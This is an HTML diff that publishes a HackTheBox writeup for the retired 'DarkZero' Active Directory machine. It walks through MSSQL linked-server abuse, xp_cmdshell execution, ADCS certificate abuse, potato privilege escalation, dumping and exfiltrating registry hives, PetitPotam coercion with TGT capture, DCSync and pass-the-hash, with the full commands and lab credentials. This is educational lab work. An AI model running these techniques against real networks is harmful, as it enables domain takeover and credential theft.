@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex">
+    <meta name="robots" content="index, follow">
     <title>DarkZero - Hexicon Archives</title>
     <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
     <link rel="stylesheet" href="../style.css">
     <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/machines/DarkZero.html" />
     <!-- Machine-specific metadata for SEO -->
-    <meta name="description" content="Restricted writeup for DarkZero machine from HackTheBox - Hard difficulty level">
+    <meta name="description" content="Detailed writeup for DarkZero machine from HackTheBox - Hard difficulty level">
     <meta name="keywords" content="HackTheBox, DarkZero, Hard, CTF, writeup, cybersecurity, penetration testing, Hexicon">
 </head>
 <body>
@@ -59,16 +59,157 @@
         <h1 class="writeup-title">DarkZero</h1>
         <div class="writeup-metadata">
             <span class="difficulty hard">Hard</span>
-            <span class="date">Active machine</span>
+            <span class="date">April 4, 2026</span>
         </div>
         
         <div class="writeup-container">
             <div class="writeup-body">
                 <!-- Machine-specific content goes here -->
                 <p><img alt="pwned" src="../images/DarkZero/pwned.png" /></p>
-<p>DarkZero is an ACTIVE machine!</p>
-<p>This write-up will go live once DarkZero retires.</p>
-<p>Please note that I’m following Hack The Box’s guidelines by not posting detailed solutions while the machine is still live.</p>
+<p>DarkZero was a hard-difficulty Windows Active Directory machine that began with an nmap scan revealing a typical domain controller port layout, including MSSQL running on port 1433.
+Initial BloodHound enumeration using provided credentials for john.w mapped out the domain and uncovered a mutual trust relationship between two domains: darkzero.htb and darkzero.ext.</p>
+<p>Connecting to the MSSQL service revealed a linked server relationship between DC01.darkzero.htb and DC02.darkzero.ext, where john.w could authenticate as sql_svc.
+Querying the link confirmed that sql_svc held sysadmin privileges on DC02's database instance, allowing xp_cmdshell to be enabled and a remote shell obtained on DC02.</p>
+<p>The resulting shell lacked SeImpersonatePrivilege due to being a network logon session. To obtain an interactive shell type where the privilege would be present, the sql_svc account's NTLM hash was needed.
+Since ADCS was running on DC02, Certify was used to request a certificate using the enabled User template, which was then converted to a PFX and authenticated against the darkzero.ext domain via certipy-ad through a Ligolo tunnel, recovering sql_svc's NTLM hash.</p>
+<p>With the hash, sql_svc's password was changed using impacket-changepasswd, and RunasCs was used to spawn a process under a Service logon type, restoring SeImpersonatePrivilege.
+GodPotato was then chained with RunasCs to achieve SYSTEM-level command execution without spawning an interactive shell.</p>
+<p>Rather than taking the direct path to a SYSTEM shell, the SYSTEM and SAM registry hives were exfiltrated by writing a batch file using Set-Content with ASCII encoding to avoid PowerShell's default UTF-16 LE BOM corruption.
+Since outbound SMB was blocked, the SYSTEM hive was split into 1MB chunks via PowerShell and downloaded individually through the mssqlclient session, then reassembled locally. Secretsdump extracted the local administrator hash from the hives, and psexec provided a SYSTEM shell on DC02, yielding the user flag.</p>
+<p>For the root flag, DC02 was found to have the TrustedForDelegation property set, meaning it would receive and cache forwardable TGTs whenever any principal authenticated to it.
+Rubeus was launched in monitor mode on DC02, and PetitPotam was used via netexec's coerce_plus module to force DC01 to authenticate to DC02, causing DC01's TGT to be captured in memory and surfaced by Rubeus.
+The ticket was saved in kirbi format, converted to ccache, and used to perform a DCsync against DC01 with impacket-secretsdump, recovering the domain administrator's NTLM hash and granting full access to DC01.</p>
+<h1>User flag</h1>
+<p><img alt="nmap" src="../images/DarkZero/nmap.png" /></p>
+<p>Initial nmap scan reveals a bunch of ports open, characteristic of an AD DC. One thing to remember is that MSSQL is available and running on port 1433.</p>
+<h2>Bloodhound enumeration</h2>
+<p>Since I have credentials for John.W to start with, I will use <code>Bloodhound</code> to map out the domain and its objects.</p>
+<p><code>bloodhound-python -c all -d darkzero.htb -u john.w -p 'RFulUtONCOL!' -dc DC01.darkzero.htb -ns 10.129.20.33 --zip</code></p>
+<p><img alt="data" src="../images/DarkZero/data.png" /></p>
+<p>However, the only thing that Bloodhound showed me was that there are 2 domains in this scenario, and that there is mutual trust between them.</p>
+<p><img alt="mutual" src="../images/DarkZero/mutual.png" /></p>
+<h2>Exploring NSSQL</h2>
+<p>I'll take a look at the MSSQL service running on port 1433 to see whether John can access it at all.</p>
+<p><code>impacket-mssqlclient darkzero.htb/john.w:'RFulUtONCOL!'@DC01.darkzero.htb -windows-auth</code></p>
+<p><img alt="linked" src="../images/DarkZero/linked.png" /></p>
+<p>DC01 is linked with the <code>DC02.darkzero.ext</code> server. John.w can connect to DC02 as sql_svc, so let's check out that link and what it allows.</p>
+<pre class="codehilite"><code>use_link &quot;DC02.darkzero.ext&quot; -&gt; Activates the link. If this succeeds, we are sql_svc on DC02
+
+SELECT SUSER_SNAME() AS CurrentUser, SYSTEM_USER AS SystemUser; -&gt; Checks the current user
+
+SELECT IS_SRVROLEMEMBER('sysadmin'); -&gt; Checks whether the current user is a sysadmin
+</code></pre>
+
+<p><img alt="sysadmin" src="../images/DarkZero/sysadmin.png" /></p>
+<p>sql_svc is a sysadmin on DC02's DB. This means that I can enable xp cmdshell and get a shell on that box.</p>
+<pre class="codehilite"><code>enable_xp_cmdshell
+
+xp_cmdshell &quot;powershell -e &lt;ENC_COMMAND&gt;&quot;
+</code></pre>
+
+<p><img alt="shell" src="../images/DarkZero/shell.png" /></p>
+<h2>Getting sql_svc NTLM hash</h2>
+<p><img alt="missing" src="../images/DarkZero/missing.png" /></p>
+<p><code>SeImpersonatePrivilege</code> is more often than not available for svc accounts. The reason why it is not here right now could be that this is a network logon(type 3?) shell, which might have some restrictions regarding the token.</p>
+<p>To check whether this is true, I would want to get a more favorable shell type, which is interactive(2). However, I would need credentials of the svc sql account, and the NT hash is not sufficient for this.</p>
+<p>There are a few ways to do this. We can force an authentication attempt with <code>xp_dirtree</code> to get the account's NetNTLMv2 hash. If ADCS exists, we can use an approach similar to the one in the <code>Mist</code> box, which is to request and authenticate with a certificate to obtain the user's NTLM hash.</p>
+<p>I'll use the latter approach, as it doesn't rely on a weak password, unlike the first one.</p>
+<pre class="codehilite"><code>.\Certify.exe cas /domain:darkzero.ext -&gt; List Certificate Authorities
+
+.\Certify.exe find /ca:DC02.darkzero.ext\darkzero-ext-DC02-CA /domain:darkzero.ext -&gt; Find all enabled certificate templates. We are looking for an enabled template that has the client authentication EKU, like the user template.
+</code></pre>
+
+<p><img alt="template" src="../images/DarkZero/template.png" /></p>
+<p>The user template is enabled. I'll use this one to get a certificate.</p>
+<p><code>.\Certify.exe request /ca:DC02.darkzero.ext\darkzero-ext-DC02-CA /template:User</code></p>
+<p><img alt="cert" src="../images/DarkZero/cert.png" /></p>
+<p>The certificate has been successfully requested and issued. I'll copy it over to my machine briefly to convert it into a valid .pfx certificate package.</p>
+<p><code>openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx</code></p>
+<p>To actually authenticate to the .ext domain, I will stand up a Ligolo tunnel between my svc_sql shell and my box.</p>
+<p><img alt="ip" src="../images/DarkZero/ip.png" /></p>
+<pre class="codehilite"><code>sudo ip tuntap add user kalin mode tun ligolo
+
+sudo ip link set ligolo up
+
+sudo ip route add 172.16.20.0/24 dev ligolo
+</code></pre>
+
+<p>Once that is set up, I can use <code>certipy-ad</code> from my box to authenticate to the second domain directly.</p>
+<p><code>certipy-ad auth -pfx cert.pfx -dc-ip 172.16.20.2 -domain darkzero.ext</code></p>
+<p><img alt="hash" src="../images/DarkZero/hash.png" /></p>
+<p><code>sql_svc | 816ccb849956b531db139346751db65f</code></p>
+<h2>Regaining SeImpersonatePrivilege</h2>
+<p>Now that I have the hash, I will change the password of svc_sql so that I can use RunasCs to run commands with different logon types set.</p>
+<p><code>impacket-changepasswd darkzero.ext/svc_sql@DC02.darkzero.ext -hashes "aad3b435b51404eeaad3b435b51404ee:816ccb849956b531db139346751db65f" -newpass "Password123!"</code></p>
+<p><img alt="changed" src="../images/DarkZero/changed.png" /></p>
+<p>Afterwards, I'll run <code>whoami /priv</code> via RunasCs with logon type 5 (Service logon)</p>
+<p><code>.\runascs.exe svc_sql "Password123!" "whoami /priv" -l 5 -b</code></p>
+<p><img alt="impersonate" src="../images/DarkZero/impersonate.png" /></p>
+<p>Success! Spawning processes with the Service logon type allows me to use the desired token. Now I'll use GodPotato to abuse it, chained with RunasCs to avoid spawning redundant shells.</p>
+<p><a href="https://github.com/BeichenDream/GodPotato">https://github.com/BeichenDream/GodPotato</a></p>
+<p><code>.\runascs.exe svc_sql "Password123!" "cmd /c C:\programdata\gp.exe -cmd whoami" -l 5 -b</code></p>
+<p><img alt="success" src="../images/DarkZero/success.png" /></p>
+<h2>Saving the registry hives without spawning a shell</h2>
+<p>System access confirmed. I want to test something new, though, so I'll try to abuse it without spawning a system shell. My goal will be to exfiltrate the SYSTEM and SAM hives without an interactive system shell.</p>
+<p><code>.\RunasCs.exe svc_sql "Password123!" "cmd /c C:\programdata\gp.exe -cmd C:\windows\system32\reg.exe save hklm\system C:\programdata\system" -l 5 -b</code></p>
+<p><img alt="error" src="../images/DarkZero/error.png" /></p>
+<p>The command is correct, but the output makes it look as if it wasn't. This could be because GodPotato expects a single command like "whoami" or a program to run, not a multi-piece input.</p>
+<p>I will use a batch file instead, which will contain the two commands I want to run.</p>
+<pre class="codehilite"><code>echo &quot;C:\windows\system32\reg.exe save hklm\system C:\programdata\system&quot; &gt; dump.bat
+
+echo &quot;C:\windows\system32\reg.exe save hklm\sam C:\programdata\sam&quot; &gt;&gt; dump.bat
+
+.\RunasCs.exe svc_sql &quot;Password123!&quot; &quot;cmd /c C:\programdata\gp.exe -cmd C:\programdata\dump.bat&quot; -l 5 -b
+</code></pre>
+
+<p><img alt="weird" src="../images/DarkZero/weird.png" /></p>
+<p>But this also fails, with a peculiar error messsage. Further research reveals that this is an issue related to how PowerShell writes output using its own pipeline. Echo (An alias for Write-Output) and Set-Content default to UTF-16 LE with BOM(Byte Order Mark). The BOM is a bunch of invisible characters at the beginning of the file, which corrupts the first line and prevents it from running.</p>
+<pre class="codehilite"><code>Set-Content -Path C:\programdata\dump.bat -Value &quot;C:\Windows\System32\reg.exe save hklm\system C:\programdata\system /y&quot; -Encoding ASCII
+
+Add-Content -Path C:\programdata\dump.bat -Value &quot;C:\Windows\System32\reg.exe save hklm\sam C:\programdata\sam /y&quot; -Encoding ASCII
+</code></pre>
+
+<p>To avoid that, I'll force the output to be ASCII encoded, getting rid of UTF-16LE and BOM shenanigans.</p>
+<p>The <code>/y</code> flag is used to overwrite any possible remains of the previously-failed commands.</p>
+<p><img alt="saved" src="../images/DarkZero/saved.png" /></p>
+<p>Now I'll download the hives onto my machine. This can be done from the level of my MSSQL-client shell.</p>
+<p><img alt="killed" src="../images/DarkZero/killed.png" /></p>
+<p>While the SAM hive downloaded successfully, the SYSTEM hive has effectively killed my MSSQL session. That was to be expected, though, as the latter hive is much bigger.</p>
+<p>The bigger issue right now is that outbound SMB traffic seems to be blocked, effectively denying the use of smbclient for exfil. I will split the system hive into 1MB chunks, and I'll download each of them manually with my mssqlclient shell.</p>
+<p><code>$filePath = 'C:\programdata\system'; $chunkSize = 1MB; $in = [System.IO.File]::OpenRead($filePath); try { $i = 0; while ($in.Position -lt $in.Length) { $outPath = "{0}.{1:d4}" -f $filePath, $i; $out = [System.IO.File]::OpenWrite($outPath); $buffer = New-Object byte[] $chunkSize; $read = $in.Read($buffer, 0, $buffer.Length); $out.Write($buffer, 0, $read); $out.Close(); $i++ } } finally { $in.Close() }</code></p>
+<p><img alt="chunks" src="../images/DarkZero/chunks.png" /></p>
+<p>Once all 11 pieces are on my machine, I'll assemble them into the proper system hive.</p>
+<p><code>cat system.00* &gt; system</code></p>
+<p><img alt="assembled" src="../images/DarkZero/assembled.png" /></p>
+<p>With the two hives obtained, I will now run secretsdump locally to extract NTLM hashes of all users on the domain.</p>
+<p><code>impacket-secretsdump -system system -sam sam local</code></p>
+<p><img alt="hashes" src="../images/DarkZero/hashes.png" /></p>
+<p><code>administrator | 6963aad8ba1150192f3ca6341355eb49</code></p>
+<p>And now with the hash in my hands, I'll run psexec to obtain a SYSTEM shell.</p>
+<p><code>psexec.py darkzero.ext/administrator@DC02.darkzero.ext -hashes ":6963aad8ba1150192f3ca6341355eb49"</code></p>
+<p><img alt="user" src="../images/DarkZero/user.png" /></p>
+<p>(Yes, I am aware that this is an awfully roundabout way and that the system shell could have been obtained with GodPotato way quicker... But this was quite a fun self-imposed challenge!)</p>
+<h1>Root flag</h1>
+<p><img alt="trusted" src="../images/DarkZero/trusted.png" /></p>
+<p>While examining the newly-pwned DC, I noticed that it had the <code>TrustedForDelegation</code> property set to true. This means that whenever someone or something authenticates to this DC, it will receive a TGT alongside the Service Ticket for said user. This TGT is then stored in LSASS memory... Which we can read with administrative access.</p>
+<p>The key detail here is that the caching happens on inbound authentication. The flag doesn't proactively pull tickets, it just tells the KDC to include a forwardable TGT when someone authenticates to it, which is exactly why coercion techniques like PrinterBug or PetitPotam are so effective in this scenario: rather than waiting for organic authentication, an attacker can force a target to authenticate on demand and grab their TGT the moment it lands in memory.</p>
+<h2>Coercing DC01 to authenticate to DC02</h2>
+<p>It doesn't matter whether SMB/LDAP signing is enforced in this scenario, because I'm not going to be doing any sort of relaying. I'll run Rubeus in monitor mode on DC02, so that it'll capture every incoming ticket for me to read and examine.</p>
+<p><code>.\Rubeus.exe monitor /nowrap /interval:5</code></p>
+<p>After that is up and running, I'll coerce DC01 to authenticate to DC02 using netexec's coerce_plus module.</p>
+<p><code>nxc smb 10.129.20.118 -u john.w -p 'RFulUtONCOL!' -M coerce_plus -o LISTENER=DC02.darkzero.ext METHOD=PetitPotam</code></p>
+<p><img alt="tgt" src="../images/DarkZero/tgt.png" /></p>
+<p>Soon after coercing the authentication, Rubeus captures DC01's TGT and outputs it in base64. I'll copy this, and I'll save it into the DC01.kirbi file. At the same time, I'll convert the .kirbi ticket into .ccache, so that I can use it with impacket tools.</p>
+<p><img alt="convert" src="../images/DarkZero/convert.png" /></p>
+<h2>DCsync against DC01</h2>
+<p>Now I will use this ticket to perform a DCsync against DC01 itself.</p>
+<p><code>impacket-secretsdump darkzero.htb/'DC01$'@DC01.darkzero.htb -k -no-pass</code></p>
+<p><img alt="dcsync" src="../images/DarkZero/dcsync.png" /></p>
+<p><code>administrator | 5917507bdf2ef2c2b0a869a1cba40726</code></p>
+<p>And as the final step, I'll connect to the DC as the administrator to grab the root flag.</p>
+<p><code>evil-winrm-py -u administrator -H '5917507bdf2ef2c2b0a869a1cba40726' -i 10.129.20.232</code></p>
+<p><img alt="root" src="../images/DarkZero/root.png" /></p>
+<p>Rooted!</p>
             </div>
             
             <div class="toc-sidebar">
@@ -87,7 +228,7 @@
     
     <footer>
         <div class="container">
-            <p>&copy; 2025 Hexicon Archives | Created by Hexicon</p>
+            <p>&copy; 2026 Hexicon Archives | Created by Hexicon</p>
         </div>
     </footer>
 
